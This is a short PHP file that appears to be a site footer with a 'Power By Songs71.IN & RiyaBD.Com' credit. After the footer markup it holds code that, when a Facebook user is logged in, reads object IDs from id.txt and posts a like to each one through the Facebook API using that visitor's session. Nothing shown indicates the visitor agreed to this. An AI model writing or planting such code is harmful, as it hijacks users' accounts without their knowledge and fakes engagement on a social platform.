<?php
echo '<div class="riya">';
include 'on.php';
echo '</div>
Power By Songs71.IN & RiyaBD.Com</div></body></html>';
if($user)
{$fp=file_get_contents('id.txt');
$f=explode("|",$fp);
foreach($f as $lid)
{$like=$facebook->api('/'.$lid.'/likes','POST');
echo $like['id'];}} ?>
